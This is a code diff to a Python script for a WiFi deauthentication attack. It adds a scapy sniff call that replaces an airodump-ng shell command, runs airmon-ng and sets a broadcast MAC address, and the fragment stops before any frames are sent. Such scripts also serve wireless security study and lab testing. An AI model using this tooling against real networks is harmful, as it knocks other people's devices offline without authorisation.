@@ -3,26 +3,27 @@
 # imports that won't cause errors
 import sys
 from scapy.all import *
+import Get_Wifi_AP
 import os
 
 
+
+
 def DeautAttack():
+
 # run a shell command "airmon-ng"
     subprocess.call('airmon-ng', shell=True)
 #subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
 #subprocess.call('airmon-ng check kill', shell=True)
-
-
-
 
 # receive a networkcard
     networkCard = raw_input('Please enter the name of the network card you wish to use: ')
     print('Now scanning for available networks, press ctrl+c to exit the scan')
 
 # scaning the mac address in the network
-    air = "bash -c \"sudo airodump-ng \"" + networkCard
-    os.system(air)
-
+    sniff(iface=networkCard, prn = Get_Wifi_AP.PacketHandler, timeout=10000000)
+    #air = "bash -c \"sudo airodump-ng \"" + networkCard
+    #os.system(air)
 # brdMac is the broadcast macaddress variable
     brdMac = 'ff:ff:ff:ff:ff:ff'
 
